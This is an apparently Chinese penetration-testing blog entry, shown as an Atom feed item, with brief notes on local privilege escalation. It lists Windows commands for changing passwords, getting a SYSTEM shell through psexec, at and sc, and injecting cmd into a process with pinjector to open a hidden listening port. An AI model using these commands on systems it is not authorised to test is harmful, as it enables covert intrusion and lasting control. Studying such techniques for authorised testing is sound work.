    <content type="html"><![CDATA[<h3 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h3><p>已实现本地低权限账号登录<br>    远程溢出<br>    直接获得账号密码<br>希望获取更高权限<br>    实现对目标进一步控制<br>系统账号之间权限隔离<br>    操作系统安全的基础<br>    用户空间<br>    内核空间<br>系统账号<br>    用户账号登录时获取权限令牌<br>    服务账号无需用户登录已在后台启动服务</p><h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h5><pre><code>userAdministratorSystem    net user owl *        #修改密码    net user    #查看用户账号</code></pre><h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><strong>Linux</strong></h5><pre><code>userRoot</code></pre><blockquote><h4 id="Administrator提权为SYSTEM"><a href="#Administrator提权为SYSTEM" class="headerlink" title="Administrator提权为SYSTEM"></a>Administrator提权为SYSTEM</h4></blockquote><p>Windows system账号<br>    系统设置管理功能<br>    SysInternal Suite<br>        <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/</a></p><pre><code>psexec -i -s -d taskmgrat 19:39 /interactive cmd    #win10已弃用at,改用sc和schtaskssc Create syscmd binPath=&quot;cmd /K start&quot; type=own type=interactsc start syscmd</code></pre><blockquote><h4 id="注入进程提权"><a href="#注入进程提权" class="headerlink" title="注入进程提权"></a>注入进程提权</h4></blockquote><pre><code>隐蔽痕迹pinjector.exe    http://www.tarasco.org/security/Process_Injector/pinjector.exe -l    #查看可注入进程pinjecter.exe -p 3012 cmd 6666 #将CMD注入到PID为3012的进程,并开放端口6666</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;本地提权&quot;&gt;&lt;a href=&quot;#本地提权&quot; class=&quot;headerlink&quot; title=&quot;本地提权&quot;&gt;&lt;/a&gt;本地提权&lt;/h3&gt;&lt;p&gt;已实现本地低权限账号登录&lt;br&gt;    远程溢出&lt;br&gt;    直接获得账号密码&lt;br&gt;希望获取更高权限&lt;br&gt;    实现
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="权限维持" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
    
      <category term="提权" scheme="http://c.cat.plus/tags/%E6%8F%90%E6%9D%83/"/>
    
      <category term="pinjector" scheme="http://c.cat.plus/tags/pinjector/"/>
    
  </entry>
  
</feed>
